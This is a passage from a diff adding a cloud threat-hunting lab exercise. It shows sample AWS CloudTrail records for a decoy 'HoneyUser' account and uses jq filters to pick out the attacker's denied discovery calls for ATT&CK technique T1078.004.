+                    "arn": "arn:aws:iam::123456789010:user/HoneyUser",
+                    "accountId": "123456789010",
+                    "accessKeyId": "AKIATAI5Z6332LPA5KXG",
+                    "userName": "HoneyUser"
+                },
+                "eventTime": "2023-03-18T11:52:35Z",
+                "eventSource": "ec2.amazonaws.com",
+                "eventName": "DescribeInstances",
+                "awsRegion": "us-east-1",
+                "sourceIPAddress": "3.235.120.49",
+                "userAgent": "aws-cli/2.11.2 Python/3.11.2 Linux/4.14.255-305-242.531.amzn2.x86_64 exec-env/CloudShell exe/x86_64.amzn.2 prompt/off command/ec2.describe-instances",
+                "errorCode": "Client.UnauthorizedOperation",
+                "errorMessage": "You are not authorized to perform this operation.",
+                "requestParameters": {
+                    "instancesSet": {},
+                    "filterSet": {}
+                },
+                "responseElements": null,
+                "requestID": "5682e090-b783-4823-9a15-48fef727c137",
+                "eventID": "9b31e889-f920-48d8-a648-81e30ab5f115",
+                "readOnly": true,
+                "eventType": "AwsApiCall",
+                "managementEvent": true,
+                "recipientAccountId": "123456789010",
+                "eventCategory": "Management",
+                "tlsDetails": {
+                    "tlsVersion": "TLSv1.2",
+                    "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                    "clientProvidedHostHeader": "ec2.us-east-1.amazonaws.com"
+                }
+            }
+            {
+                "eventVersion": "1.08",
+                "userIdentity": {
+                    "type": "IAMUser",
+                    "principalId": "AIDATAI5Z633QFORB2QCN",
+                    "arn": "arn:aws:iam::123456789010:user/HoneyUser",
+                    "accountId": "123456789010",
+                    "accessKeyId": "AKIATAI5Z6332LPA5KXG",
+                    "userName": "HoneyUser"
+                },
+                "eventTime": "2023-03-18T11:53:44Z",
+                "eventSource": "dynamodb.amazonaws.com",
+                "eventName": "ListTables",
+                "awsRegion": "us-east-1",
+                "sourceIPAddress": "3.235.120.49",
+                "userAgent": "aws-cli/2.11.2 Python/3.11.2 Linux/4.14.255-305-242.531.amzn2.x86_64 exec-env/CloudShell exe/x86_64.amzn.2 prompt/off command/dynamodb.list-tables",
+                "errorCode": "AccessDenied",
+                "errorMessage": "User: arn:aws:iam::123456789010:user/HoneyUser is not authorized to perform: dynamodb:ListTables on resource: arn:aws:dynamodb:us-east-1:123456789010:table/* because no identity-based policy allows the dynamodb:ListTables action",
+                "requestParameters": null,
+                "responseElements": null,
+                "requestID": "KM21C3GVN2GJQU0LV0TQUSJQE7VV4KQNSO5AEMVJF66Q9ASUAAJG",
+                "eventID": "4b5aec6a-6a0f-4812-812e-dcd6c6d19d24",
+                "readOnly": true,
+                "eventType": "AwsApiCall",
+                "managementEvent": true,
+                "recipientAccountId": "123456789010",
+                "eventCategory": "Management",
+                "tlsDetails": {
+                    "tlsVersion": "TLSv1.2",
+                    "cipherSuite": "ECDHE-RSA-AES128-GCM-SHA256",
+                    "clientProvidedHostHeader": "dynamodb.us-east-1.amazonaws.com"
+                }
+            }
+            ```
+
+    5. That data is still quite noisy, but it appears that we can find just the `HoneyUser` actions. But what, exactly, was the attacker attempting to perform? Use one more `jq` filter to extract the `eventName` values.
+
+        ```bash
+        zcat /home/cloudshell-user/cloudtrail-logs/*.json.gz  | \
+          jq -r '.Records[] | select(.userIdentity.userName == "HoneyUser") | .eventName'
+        ```
+
+        !!! summary "Expected results"
+
+            ```bash
+            ListBuckets
+            DescribeInstances
+            ListTables
+            ```
+
+    6. It looks like everything was caught **except** the `aws iam list-users` command. This appears to not show up in the CloudTrail data!
+
+## Conclusion
+
+In this exercise, you walked through an example hunt for ATT&CK technique T1078.004 discovery using a honey user. That was a lot of manual effort. In the next exercise, you will automate this discover with the assistance of a few cloud services.
